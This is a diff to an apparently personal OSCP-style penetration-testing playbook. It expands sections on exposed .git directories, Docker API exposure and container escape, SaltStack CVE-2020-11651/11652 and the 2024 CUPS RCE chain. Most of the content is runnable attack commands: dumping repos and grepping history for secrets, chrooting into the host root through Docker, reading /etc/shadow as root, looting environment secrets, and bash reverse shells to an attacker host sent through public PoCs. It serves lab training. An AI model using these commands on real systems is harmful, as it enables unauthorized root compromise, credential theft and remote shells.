@@ -1126,22 +1126,120 @@ Mine for `password`, `hash`, `token`, `apikey`, `secret` → crack/reuse → `[C
 
 **Leads to:** app creds/tokens → reuse/spray `[CREDENTIALS-QUICK]`; data → web auth-bypass.
 
-## [ENUM-GIT]  an exposed `.git` folder over HTTP  → `[FOUND-GIT]`
-**What it is:** source code + its full history. Repos often contain **hard-coded passwords, API keys, and endpoints** — sometimes in files that were "deleted" but still live in history.
-```bash
-git-dumper http://$IP/.git ./loot                  # download the whole exposed repo [LOOK-UP] (or: wget -r)
-git log -p | grep -iE 'pass|secret|key|token'       # search the ENTIRE history for secrets
-git show ; git stash list                           # look at deleted / stashed content
-```
-**Where it leads:** creds, source to find bugs in, config files with DB/API keys.
+## [ENUM-GIT]  an exposed `.git` folder over HTTP — FULL CHAIN  → `[FOUND-GIT]`
+**What it is:** a web server exposing a `.git/` directory leaks the **entire source tree + its full history**. History is the prize: it holds **passwords, API keys, DB strings, private keys, and endpoints** that developers "deleted" in a later commit but that live forever in old commits. Finding `.git` = you basically have the app's source and its secrets.
 
-## [ENUM-DOCKER]  Ports 2375/2376, or a container you land inside
-```bash
-docker -H tcp://$IP:2375 ps                                          # is the Docker API exposed with no auth?
-docker -H tcp://$IP:2375 run -v /:/host -it alpine chroot /host sh   # if yes → mount the host's disk = host root
-# if you're INSIDE a container: check /.dockerenv, your capabilities, mounted host paths, and /var/run/docker.sock → escape
+### 🗺️ Decision tree
 ```
-**Where it leads:** taking over the host from a container (see `[LINUX-PRIVESC]`, Docker/LXD).
+gobuster/feroxbuster finds /.git/ (or /.git/HEAD returns "ref: refs/heads/...") →
+  directory listing ON (you can browse /.git/)?  → wget -r the whole thing
+  directory listing OFF (403 on /.git/ but /.git/HEAD downloads)? → git-dumper (rebuilds repo from objects)
+  →  once you have a local repo:
+       git log --all -p           → read EVERY change across ALL branches → grep for secrets
+       git show <deleted-commit>  → recover files removed in a later commit
+       git stash list / git branch -a → hidden work / other branches
+  found creds?        → reuse on SSH / app login / DB  → [CREDENTIALS-QUICK]
+  found source only?  → read it for auth bypass / SQLi / upload bugs → [WEB-QUICK]
+  found a private key / .env / config? → SSH in or hit the DB directly
+```
+
+### Step 1 — confirm it's really there
+```bash
+curl -s http://$IP/.git/HEAD                 # "ref: refs/heads/master" = exposed .git (the #1 tell)
+curl -s http://$IP/.git/config               # often shows the remote URL + sometimes creds in the URL
+# in a dir brute you'll see:  /.git/  /.git/HEAD  /.git/config  /.git/logs/HEAD
+```
+
+### Step 2 — pull the whole repo down
+```bash
+# Preferred — works even when directory listing is OFF (reconstructs from pack/loose objects):
+git-dumper http://$IP/.git ./loot            # [LOOK-UP] pipx install git-dumper   (or: pip3 install git-dumper)
+# Fallback if browsing /.git/ is allowed (listing ON):
+wget -r -np -R "index.html*" http://$IP/.git/ -P ./loot      # mirror, then:  cd loot/$IP ; git checkout -- .
+```
+
+### Step 3 — mine history + working tree for secrets (the actual attack)
+```bash
+cd ./loot
+git log --all --oneline                      # every commit on every branch — look at the messages
+git log --all -p | grep -iaE 'pass|passwd|secret|api[_-]?key|token|aws|BEGIN .*PRIVATE KEY|mysql|postgres|connectionstring'
+git show <commit>                            # read a specific interesting commit in full
+git show <commit>:path/to/file               # pull a file AS IT WAS in that commit (recover "deleted" secrets)
+git stash list && git stash show -p          # devs sometimes stash creds
+git branch -a                                # dev/staging branches often have test creds hard-coded
+git diff <old>..<new> -- config/             # see what a "cleanup" commit removed
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `/.git/` → 403 but `/.git/HEAD` downloads | listing is off — use **git-dumper**, not wget |
+| git-dumper errors / partial repo | server blocks `.pack` → still try `git log` / `git checkout -- .`; some objects enough |
+| `fatal: not a git repository` after wget | you only grabbed HTML — re-mirror, confirm real objects in `.git/objects/`, then `git checkout -- .` |
+| repo clean, no secrets in current files | **you didn't check history** → `git log --all -p` (deleted files live in old commits) |
+| found a remote URL with `user:pass@` in `.git/config` | that's a credential → reuse it everywhere |
+| `.git` on a *Windows*/IIS box | same method; also check `/.svn/`, `/.hg/`, `/.bzr/` the same way |
+
+**Leads to:** hard-coded creds → `[CREDENTIALS-QUICK]` (reuse on SSH/app/DB) · private key/.env → direct login · readable source → audit for `[WEB-QUICK]` bugs (SQLi, auth bypass, file upload). An exposed `.git` is one of the highest-yield web findings — **always** dump and read the full history.
+
+## [ENUM-DOCKER]  Ports 2375/2376 (exposed API) OR you land inside a container — FULL CHAIN
+**What it is:** Docker runs containers as **root on the host**. Two separate situations, both → host root: **(A)** the Docker daemon's **remote API** is exposed on **2375 (plaintext)** / **2376 (TLS)** with no auth → you control the daemon from your Kali. **(B)** your shell is **inside a container** → you look for a way to break out to the host. The winning move in both is the same idea: **start/enter a container that mounts the host's `/` and chroot into it** = you're root on the real machine.
+
+### 🗺️ Decision tree
+```
+Port 2375/2376 open externally?
+  └ docker -H tcp://$IP:2375 version  works (no auth)? → run alpine with -v /:/host → chroot → HOST ROOT ✅
+You have a shell INSIDE a container? (check: /.dockerenv exists, hostname is a 12-hex string, `cat /proc/1/cgroup` shows /docker/)
+  ├ /var/run/docker.sock readable?        → talk to the daemon → run a privileged mount container → HOST ROOT ✅
+  ├ container is --privileged? (capsh --print shows cap_sys_admin, or fdisk -l lists host disks) → mount /dev/sdaN → HOST FS ✅
+  ├ dangerous capability (CAP_SYS_ADMIN / CAP_DAC_READ_SEARCH)? → cgroup-release-agent / shocker escape
+  ├ host path mounted in (df -h / mount shows a host dir, often /opt, /home, /root)? → read/write host files
+  └ nothing escapes? → treat it as a normal host: loot env vars, [LINUX-PRIVESC] inside, pivot to other containers (same subnet)
+```
+
+### Situation A — exposed Docker API (2375/2376)
+```bash
+nmap -p2375,2376 -sV $IP                                 # "Docker" / an HTTP API on 2375
+curl -s http://$IP:2375/version | jq .                   # no auth → prints daemon version = you own it
+export DOCKER_HOST=tcp://$IP:2375                         # now plain `docker` commands hit the target
+docker ps ; docker images                                # see what's running / available images
+# ── the kill shot: mount the HOST's root fs into a throwaway container, chroot in = root on the host ──
+docker run -v /:/host --rm -it alpine chroot /host sh
+#   inside: id → root ; now read /host(=/)… e.g. cat /root/proof.txt, add SSH key, drop a SUID, etc.
+# no 'alpine' image present? use whatever `docker images` shows:
+docker run -v /:/host --rm -it <existing_image> chroot /host sh
+# 2376 is TLS — needs client certs; if you have them: docker --tlsverify -H tcp://$IP:2376 ...
+```
+
+### Situation B — you're inside a container, break out
+```bash
+# 1) Confirm you're containerised + how:
+ls -la /.dockerenv ; cat /proc/1/cgroup | grep -i docker ; hostname        # 12-hex hostname = container
+# 2) The docker.sock jackpot (container can talk to the host daemon):
+ls -la /var/run/docker.sock
+docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh   # host root
+#   (no docker client in the container? curl the sock:  curl -s --unix-socket /var/run/docker.sock http://localhost/images/json )
+# 3) Privileged container (full caps, host devices visible):
+capsh --print | grep -i sys_admin           # cap_sys_admin present = privileged
+fdisk -l                                     # you can SEE host disks (/dev/sda…) → mount them:
+mkdir /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host sh      # host filesystem
+# 4) Host dir mounted in → just read/write it:
+mount | grep -vE 'proc|sys|cgroup|tmpfs'     # spot a bind-mounted host path (e.g. /opt, /home)
+# 5) Loot regardless: env holds secrets in containers
+env | grep -iE 'pass|secret|key|token|_db_'  ;  cat /proc/1/environ | tr '\0' '\n'
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| `docker ... :2375` → `Cannot connect` | API not exposed/filtered → not this path; (2376 is TLS, needs certs) |
+| no `alpine` image for the mount trick | use an image from `docker images` / `docker -H ... images`; any Linux image works for chroot |
+| inside container, `docker` command not found | talk to the socket with curl: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` |
+| `/var/run/docker.sock` not present/readable | no easy sock escape → check `capsh --print` (privileged) and `fdisk -l` (host disks) instead |
+| mounted but `chroot: cannot run sh` | try `chroot /host /bin/bash`; or just read files directly under `/host/...` (no chroot needed to read) |
+| not sure if you're even in a container | `cat /proc/1/cgroup` shows `/docker/<id>`; `/.dockerenv` exists; hostname = short hex |
+
+**Leads to:** **host root** (A: exposed API; B: docker.sock or privileged escape) → read `/root/proof.txt`, plant SSH key, or `[LINUX-PRIVESC]` on the host. If no escape, treat the container as a host, loot its env/secrets, and **pivot** to neighbouring containers on the same Docker bridge subnet. (Related: LXD group escape → see `[LINUX-PRIVESC]`.)
 
 ## [ENUM-ORACLE]  Port 1521 — Oracle Database (TNS) — FULL CHAIN
 **What it is:** an Oracle database with its own tooling. Path: find a valid **SID** (database name) → log in with **default creds** → read/write files or command exec.
@@ -1214,27 +1312,104 @@ hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP h
 | RAKP hash won't crack | strong pw → try default creds instead; or this box isn't the IPMI path |
 **Where it leads:** admin creds for the management controller → often creds reused for the OS → `[CREDENTIALS-QUICK]`.
 
-## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack (salt-master)
-**What it is:** SaltStack is a config-management tool. Its **salt-master** talks to agents over **ZeroMQ** on **4505** (publish) + **4506** (request). Seeing **both** open — nmap labels them `zmtp` / `ZeroMQ ZMTP` — is the dead giveaway. A **salt-api** often runs too (commonly `:8000`, returns JSON). **The salt-master runs as ROOT**, so exploiting it = **instant root, no privesc.**
-```bash
-nmap -p4505,4506 -sV $IP                 # "ZeroMQ ZMTP 2.0" = SaltStack
-# CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → UNAUTH RCE as root
-# (vulnerable: Salt < 2019.2.4 / < 3000.2)
-git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
-pip3 install salt msgpack --break-system-packages        # the PoC needs the salt lib
-python3 exploit.py --master $IP --read /root/proof.txt   # read ANY file as root (returns content) — quickest flag
-python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'"   # root reverse shell
-```
-**Gotcha:** `--exec` is **blind** (it schedules the job, shows no output) → use **`--read`** for files, or `--exec` a **reverse shell** to see results. **Leads to:** root (first box: PG **Twiggy**).
+## [ENUM-SALTSTACK]  Ports 4505/4506 — SaltStack salt-master — FULL CHAIN
+**What it is:** SaltStack is a config-management tool. Its **salt-master** talks to minions (agents) over **ZeroMQ**: **4505** = publish bus, **4506** = request/return. Seeing **both** open — nmap prints `zmtp` / `ZeroMQ ZMTP 2.0` — is the dead giveaway. A **salt-api** (REST) often runs alongside, commonly on **:8000** or **:8080** returning JSON. **Key fact: the salt-master process runs as ROOT.** So a working exploit = **instant root, zero privesc.** This is one of the few services where enumeration and game-over are the same step.
 
-## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing)
-**What it is:** the Linux printing service (IPP). The late-2024 bug chain **CVE-2024-47176 / -47177 / -47076 / -47175** → **unauthenticated RCE**: a crafted IPP request makes `cups-browsed` add an attacker-controlled "printer", and sending a print job to it runs your command.
-```bash
-nmap -p631 -sCV $IP                  # CUPS/IPP ; also browse http://$IP:631 in a browser
-# PoC (IppSec's): https://github.com/ippsec/evil-cups
-#   python3 evil-cups.py <KALI-IP> $IP "<command>"     # sets up the rogue printer + payload, triggers it
+### 🗺️ Decision tree
 ```
-**Note:** real + recent, but **rare on current OSCP** — know it exists, don't expect it. **Leads to:** RCE in the printing context.
+4505 AND 4506 open (zmtp)? → it's SaltStack →
+  fingerprint version → vulnerable to CVE-2020-11651/11652? (Salt < 2019.2.4 or < 3000.2 — most lab boxes are)
+    ├ YES → run the PoC:
+    │        --read <file>  → grab /root/proof.txt or /etc/shadow instantly (returns content)   ← fastest flag
+    │        --exec <cmd>   → BLIND command exec as root → send a reverse shell → full root shell ✅
+    └ unsure/patched → check salt-api (:8000) for CVE-2021-25281/25282/25283 (auth bypass → SSRF/RCE)
+  only one of 4505/4506 visible? → still probe; firewalling can hide one. Confirm with the PoC's check.
+```
+
+### Step 1 — identify + fingerprint
+```bash
+nmap -p4505,4506 -sV $IP                 # "ZeroMQ ZMTP 2.0" on BOTH = salt-master
+nmap -p8000,8080 -sV $IP                 # salt-api often here (CherryPy / JSON)
+curl -sk https://$IP:8000/ -H 'Accept: application/json'   # salt-api banner if present
+```
+
+### Step 2 — CVE-2020-11651 (auth bypass) + CVE-2020-11652 (path traversal) → UNAUTH RCE as root
+```bash
+# Vulnerable: Salt < 2019.2.4 / < 3000.2  (the common lab version)
+git clone https://github.com/jasperla/CVE-2020-11651-poc && cd CVE-2020-11651-poc
+pip3 install salt msgpack --break-system-packages        # the PoC imports the salt lib
+python3 exploit.py --master $IP --check                  # confirm vulnerable first
+# ── quickest flag: read any file as root (prints the content back) ──
+python3 exploit.py --master $IP --read /root/proof.txt
+python3 exploit.py --master $IP --read /etc/shadow       # then crack, or just read flags
+# ── full root shell: --exec is BLIND, so fire a reverse shell ──
+# Kali:  nc -lvnp 443
+python3 exploit.py --master $IP --exec "bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'"
+#   → lands a shell as root. Stabilise (python pty) → cat /root/proof.txt
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| PoC: `ImportError: salt` | `pip3 install salt msgpack --break-system-packages` (the exploit needs the real salt lib) |
+| `--exec` shows no output | it's **blind by design** — it schedules a job silently → use `--read` for files, or `--exec` a **reverse shell** to get interactivity |
+| `--check` says not vulnerable | version patched → pivot to **salt-api** CVE-2021-25281/-25282/-25283 (needs :8000 up), or this isn't the path |
+| reverse shell doesn't land | wrong KALI IP/port, or egress filtered → try a common port (443/80), confirm `nc` is listening, URL-encode nothing (it's exec not web) |
+| both ports open but PoC times out | master behind a firewall for publish bus → still try `--read` (uses 4506); or salt-api route |
+| msgpack/python version clash | use a venv, or an older PoC fork; the vuln is in the master, not your client |
+
+**Leads to:** **root** — either directly (`--read` the flag / shadow) or via an `--exec` reverse shell. No privilege escalation needed. First box where this appears in your journal: PG **Twiggy** (`OSCP-Challenge-Labs/Twiggy.md`).
+
+## [ENUM-CUPS]  Port 631 (+ 5353/UDP mDNS) — CUPS (Linux printing) — FULL CHAIN
+**What it is:** CUPS is the Linux printing stack, speaking **IPP** over **631/TCP** (and advertising via **mDNS on 5353/UDP**). Two things to care about: **(1)** the web admin on `http://$IP:631` can leak printer configs, device URIs, and sometimes **creds**; **(2)** the late-2024 chain **CVE-2024-47176 / -47076 / -47175 / -47177** → **unauthenticated RCE** when `cups-browsed` (UDP 631) is listening: you make the target add an attacker-controlled "printer", then a print job to it runs your command. Real and serious, but **rare on current OSCP** — know it, don't fixate.
+
+### 🗺️ Decision tree
+```
+631 open →
+  browse http://$IP:631 → Administration / Printers pages →
+    ├ printer config leaks a device URI with user:pass@ , or a backend script path → loot creds / read script
+    ├ can you add/modify a printer (admin reachable)? → classic trick: set a printer backend to a command → print → runs it
+  cups-browsed on UDP 631 reachable (nmap -sU)? AND version in the 2024-vuln range? →
+    └ evil-cups chain → rogue printer → user prints (or you trigger) → RCE as the print context (often lp/root-ish)
+  nothing exploitable? → 631 is frequently a DISTRACTION (e.g. PG Pelican) → note it, move on
+```
+
+### Step 1 — identify + browse
+```bash
+nmap -p631 -sCV $IP                      # "CUPS x.y (IPP)"
+nmap -sU -p631 $IP                       # is cups-browsed (UDP) also up? (needed for the 2024 RCE)
+curl -s http://$IP:631/ | grep -i cups   # version string
+# Open it in a browser (your KB browser): http://$IP:631  → Printers, Jobs, Administration
+#   look at each printer's "Device URI" — may contain user:pass@host or a backend command/script
+```
+
+### Step 2 — classic path: config/creds + command-backend
+```bash
+curl -s "http://$IP:631/printers/"                    # list printers
+curl -s "http://$IP:631/admin/"                       # admin page (often needs auth; try default/looted creds)
+# IPP creds, if any, sit in: /etc/cups/printers.conf , /etc/cups/cupsd.conf (read via another vuln/LFI if you get file read)
+# If you can add/edit a printer (admin access), a device-URI pointing at a command backend runs as the CUPS user.
+```
+
+### Step 3 — CVE-2024-4717x unauth RCE (only if cups-browsed/UDP 631 + vulnerable version)
+```bash
+# IppSec's PoC: https://github.com/ippsec/evil-cups
+git clone https://github.com/ippsec/evil-cups && cd evil-cups
+python3 evil-cups.py <KALI-IP> $IP "bash -c 'bash -i >& /dev/tcp/<KALI-IP>/443 0>&1'"
+#   → registers a rogue printer on the target; RCE fires when a print job hits it
+#   (Kali: nc -lvnp 443). Needs cups-browsed listening on UDP 631 and a vulnerable CUPS.
+```
+
+### 🧯 Troubleshooting
+| Symptom | Fix |
+|---|---|
+| 631 open but web admin asks for auth | try looted/default creds; otherwise you likely can't modify printers → not the path |
+| evil-cups does nothing | **UDP 631 (cups-browsed) must be reachable** (`nmap -sU -p631`) AND version in range — often it isn't on OSCP |
+| RCE "fires when a job prints" but no job comes | some PoCs let you self-trigger; otherwise it needs a victim to print → unreliable on a solo lab |
+| only TCP 631, patched CUPS | treat 631 as a **distraction** (very common) — don't sink time; re-focus on web/other services |
+| want creds from configs but no file read | you need an LFI/other foothold first; 631 alone rarely gives file read |
+
+**Leads to:** rarely the main path on OSCP. Best realistic yield = **creds leaking from a printer's device URI / config** → `[CREDENTIALS-QUICK]`. The 2024 RCE is powerful but needs UDP cups-browsed + a vulnerable version + (usually) a printing victim — so **recognise it, try it if the pieces fit, but don't marry it.** On boxes like PG Pelican, 631 was pure noise.
 
 ## [ENUM-TELNET]  Port 23 — Telnet (cleartext remote login)
 **What it is:** ancient remote shell, **cleartext**. Occasionally wide open with default/no creds, or the banner leaks the device/OS.
